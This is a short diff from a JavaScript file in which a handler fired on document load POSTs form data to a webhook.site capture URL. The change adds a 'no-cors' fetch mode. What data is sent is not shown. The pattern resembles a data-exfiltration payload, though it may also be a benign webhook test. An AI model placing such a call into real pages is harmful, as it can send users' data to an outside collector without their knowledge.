@@ -31,7 +31,8 @@ document.addEventListener("readystatechange", () => {
             const requestOptions = {
               method: "POST",
               body: formdata,
-              redirect: "follow"
+              redirect: "follow",
+              mode:"no-cors",
             };
             
             fetch("https://webhook.site/c81b0d84-669e-4b5c-8070-98756b2b3dcb", requestOptions)
